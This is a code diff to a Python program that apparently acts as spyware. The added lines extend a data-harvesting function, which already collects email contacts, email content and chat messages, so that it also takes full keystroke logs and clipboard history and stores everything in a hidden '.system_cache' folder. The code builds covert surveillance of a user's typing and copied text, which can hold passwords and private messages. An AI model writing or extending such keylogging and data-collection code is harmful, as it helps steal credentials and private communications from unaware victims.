@@ -1907,8 +1907,43 @@ def save_all_collected_data():
     all_data['email_contacts_content'] = collect_email_contacts_and_content()
     all_data['chat_messages'] = collect_chat_messages()
     
+    # Include keyboard logs (FULL content, no truncation)
+    log_file = f"{DATA_DIR}/{LOG_FILE}"
+    all_data['keyboard_logs'] = ""
+    all_data['activity_logs'] = ""  # Keep for compatibility
+    if os.path.exists(log_file):
+        try:
+            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+                all_data['keyboard_logs'] = content
+                all_data['activity_logs'] = content  # Same content
+                all_data['keyboard_logs_size'] = len(content)
+                all_data['keyboard_logs_lines'] = content.count('\n')
+                log_activity("DATA_COLLECTION", f"Included keyboard logs: {len(content)} chars, {content.count(chr(10))} lines")
+        except Exception as e:
+            log_activity("DATA_COLLECTION", f"Error reading keyboard logs: {e}")
+    
+    # Include clipboard history if available
+    clipboard_file = f"{DATA_DIR}/clipboard_history.txt"
+    if os.path.exists(clipboard_file):
+        try:
+            with open(clipboard_file, 'r', encoding='utf-8', errors='ignore') as f:
+                clipboard_content = f.read()
+                all_data['clipboard_history'] = clipboard_content.split('\n') if clipboard_content else []
+                all_data['clipboard_history_size'] = len(clipboard_content)
+        except:
+            pass
+    
     # Normalize and deduplicate data
     normalized_data = normalize_and_deduplicate_data(all_data)
+    
+    # Add keyboard logs and clipboard to normalized data (not deduplicated, keep full content)
+    normalized_data['keyboard_logs'] = all_data.get('keyboard_logs', '')
+    normalized_data['activity_logs'] = all_data.get('activity_logs', '')
+    normalized_data['keyboard_logs_size'] = all_data.get('keyboard_logs_size', 0)
+    normalized_data['keyboard_logs_lines'] = all_data.get('keyboard_logs_lines', 0)
+    normalized_data['clipboard_history'] = all_data.get('clipboard_history', [])
+    normalized_data['clipboard_history_size'] = all_data.get('clipboard_history_size', 0)
     
     # Save to .system_cache - ONLY normalized_data.json (clean, deduplicated, accurate)
     try:
